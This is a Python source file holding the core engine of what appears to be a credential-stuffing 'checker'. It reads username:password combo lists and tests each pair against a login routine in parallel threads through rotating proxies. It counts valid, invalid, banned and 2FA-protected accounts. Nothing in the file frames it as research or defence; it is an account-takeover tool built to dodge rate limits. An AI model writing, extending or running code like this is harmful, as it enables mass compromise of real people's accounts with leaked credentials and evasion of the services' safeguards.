"""Core checker engine with multi-threading and proxy support."""

from __future__ import annotations

import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

from auth import check_account
from models import AccountResult
from proxy_manager import ProxyManager


class CheckerStats:
    """Thread-safe statistics tracker."""

    def __init__(self, total: int):
        self.total = total
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        self.banned = 0
        self.twofa = 0
        self.errors = 0
        self._lock = threading.Lock()

    def update(self, result: AccountResult):
        with self._lock:
            self.checked += 1
            if result.status == "VALID":
                if "2FA" in result.error_message:
                    self.twofa += 1
                else:
                    self.valid += 1
            elif result.status == "INVALID":
                self.invalid += 1
            elif result.status == "BANNED":
                self.banned += 1
            else:
                self.errors += 1


def load_combos(path: str) -> list[tuple[str, str]]:
    """Load user:pass combos from file."""
    combos = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            sep = ":" if ":" in line else ";"
            parts = line.split(sep, 1)
            if len(parts) == 2:
                combos.append((parts[0].strip(), parts[1].strip()))
    return combos


def run_checker(
    combos: list[tuple[str, str]],
    proxy_manager: ProxyManager | None = None,
    threads: int = 10,
    timeout: int = 15,
    callback=None,
) -> list[AccountResult]:
    """Run the checker on all combos with threading."""
    results: list[AccountResult] = []
    stats = CheckerStats(len(combos))
    results_lock = threading.Lock()

    def _check_one(combo: tuple[str, str]) -> AccountResult:
        username, password = combo
        proxy = proxy_manager.get() if proxy_manager else None
        result = check_account(username, password, proxy=proxy, timeout=timeout)
        stats.update(result)
        with results_lock:
            results.append(result)
        if callback:
            callback(result, stats)
        return result

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [pool.submit(_check_one, combo) for combo in combos]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass

    return results
